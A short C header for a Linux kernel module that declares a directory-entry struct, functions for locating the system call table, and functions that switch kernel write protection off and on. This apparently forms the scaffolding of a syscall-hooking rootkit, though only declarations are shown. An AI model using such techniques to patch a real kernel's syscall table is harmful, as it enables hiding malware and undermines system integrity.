#include <linux/module.h>
#include <linux/kernel.h>

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

unsigned long ** get_sys_call_table(void); //to get the original syscall table addr

unsigned long ** get_sys_call_table_by_entry_SYSCALL_64(void);
unsigned long ** get_sys_call_table_by_sys_close(void);

void disable_write_protection(void);
void enable_write_protection(void);

